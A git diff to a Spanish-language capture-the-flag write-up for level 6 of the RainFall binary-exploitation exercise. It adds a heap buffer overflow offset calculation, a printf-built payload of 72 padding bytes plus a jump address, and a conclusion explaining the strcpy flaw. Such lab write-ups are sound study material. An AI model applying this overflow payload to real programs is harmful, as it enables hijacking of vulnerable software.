@@ -156,12 +156,18 @@ Al llegar a al instruciión `call eax` el programa saltará a la función `n()` 
 
 1. **Identificamos el BACKDOOR**
 ```asm
-0x080484a5 <+41>:	mov    edx,0x8048468       ; Sustiur esa dirección de memoria
+0x080484a5 <+41>:	mov    edx,0x8048468       ; Sustituir esa dirección de memoria
 ```
 
 2. **Cálculo del Offset:**
 
+- 64 bytes del buffer del primer malloc + 4 bytes del puntero del 2º malloc + 4 bytes del header (puntero) de la función `n()` => 72 bytes.
+
 3. **Construcción del Payload:**
+
+- **printf 'A%.0s' {1..72}**: Pasamos como argumento los bytes basura para desbordar el buffer.
+- **printf "\x54\x84\x04\x08"**: La direccíon de memoria a la que queremos que salte.
+- **`$(printf 'A%.0s' {1..72}; printf "\x54\x84\x04\x08")`**
 
 ### **Ejecución:**
 ```bash
@@ -175,3 +181,8 @@ level7@RainFall:~$
 ```
 
 # ** 7. Conclusión:**
+
+EL el **nivel 6** la forma de explotar el binario es usando la tecnica del **Heap-based Buffer Overflow**. Esta vez desbordamos el heap en lugar del stack.
+
+Como el programa usa dos malloc seguidos podemos desbordarlos facilmente y hacer que ejecute la funciñón que nosotros deseamos. A eso le sumamos que al copiar el `argv[1]` con `strcpy()` no controla el tamaño de la string a copiar.
+
